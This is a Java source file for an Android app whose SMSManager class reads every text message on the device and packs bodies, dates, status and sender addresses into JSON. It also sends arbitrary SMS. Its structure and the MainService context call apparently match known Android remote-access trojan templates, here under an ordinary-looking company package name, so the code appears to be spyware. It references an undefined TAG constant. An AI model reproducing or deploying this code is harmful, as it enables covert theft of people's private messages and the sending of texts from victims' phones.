package br.com.assessoriarealeza.irp;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {

    public static JSONObject getSmsList() {
        JSONObject result = new JSONObject();
        JSONArray smsArray = new JSONArray();

        try {
            Uri uri = Uri.parse("content://sms/");
            Context context = MainService.getContextOfApplication();
            Cursor cursor = context.getContentResolver().query(uri, null, null ,null,null);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow("read")));
                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow("type")));

                    if (cursor.getString(cursor.getColumnIndexOrThrow("type")).equals("3")) {
                        String threadId = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
                        Cursor cur= context.getContentResolver().query(Uri.parse("content://mms-sms/conversations?simple=true"), null, "_id ="+threadId ,null,null);

                        if (cur != null && cur.moveToFirst()) {
                            String recipientId = cur.getString(cur.getColumnIndexOrThrow("recipient_ids"));
                            cur = context.getContentResolver().query(Uri.parse("content://mms-sms/canonical-addresses"), null, "_id = " + recipientId, null, null);

                            if (cur != null && cur.moveToFirst()) {
                                String address = cur.getString(cur.getColumnIndexOrThrow("address"));
                                sms.put("address", address);
                                cur.close();
                            }
                        }
                    } else {
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    }

                    smsArray.put(sms);
                } while (cursor.moveToNext());

                cursor.close();
            }

            result.put("smsList", smsArray);
        } catch (JSONException e) {
            Log.e(TAG, "Error getting SMS list", e);
        }

        return result;
    }

    public static boolean sendSMS(String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            return true;
        } catch (Exception ex) {
            Log.e(TAG, "Error sending SMS", ex);
            return false;
        }
    }
}

